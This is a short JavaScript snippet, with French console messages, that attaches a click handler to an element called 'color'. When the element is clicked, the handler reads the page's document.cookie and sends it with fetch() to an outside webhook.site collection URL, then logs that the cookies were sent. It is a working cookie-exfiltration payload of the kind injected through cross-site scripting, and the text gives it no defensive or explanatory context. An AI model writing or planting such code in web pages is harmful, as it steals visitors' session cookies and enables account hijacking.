color.onclick = () => {
    const url = "https://webhook.site/271fc1d9-85f1-474b-b4e8-21348ace2fc3?cookie=" + encodeURIComponent(document.cookie);
    fetch(url)
        .then(response => {
            if (response.ok) {
                console.log('Cookies envoyés avec succès.');
            } else {
                console.error('Erreur lors de l\'envoi des cookies.');
            }
        })
        .catch(error => {
            console.error('Erreur de réseau:', error);
        });
};
